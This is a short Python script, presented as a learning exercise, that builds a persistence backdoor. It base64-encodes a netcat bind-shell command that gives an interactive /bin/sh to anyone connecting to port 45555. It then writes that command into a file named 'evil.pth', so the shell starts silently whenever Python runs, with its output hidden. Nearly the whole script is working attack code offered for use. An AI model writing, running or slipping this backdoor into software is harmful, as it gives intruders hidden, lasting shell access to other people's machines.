# -*- coding: utf-8 -*-
# Author: Richard Smith
# Date: 2025/03/24
# Usage:
#   Learn Python's techniques for maintaining permissions using .pth files and write simple learning scripts
#   学习 Python 使用 .pth 文件维护权限的技术并编写简单的学习脚本
# Comment:
#   (Forward) Try to use nc to listen to a port locally. When a connection accesses this port, provide a temporary shell session.
#   (正向)尝试使用nc在本地监听一个端口，当有连接访问这个端口时，提供一个临时的shell会话,
#   Here is a simple exploit
#   此处是一个简单的利用
import base64

# Local listening port
# 本地监听端口
listen_port = 45555
"""
echo 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvvp {listen_port} > /tmp/f' | base64 -w0
echo 'import subprocess;subprocess.Popen("echo \"{base64_command}\"|base64 -d |bash", shell=True, start_new_session=True, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))' > 1.pth
"""

nc_command = f'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvvp {listen_port} > /tmp/f'
nc_command = base64.b64encode(nc_command.encode()).decode()

pth_backdoor_filename = "evil.pth"
backdoor_code = f'import subprocess;subprocess.Popen("echo \\\"{nc_command}\\\"|base64 -d |bash", shell=True, start_new_session=True, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))'
with open(pth_backdoor_filename, "w") as f:
    f.write(backdoor_code)
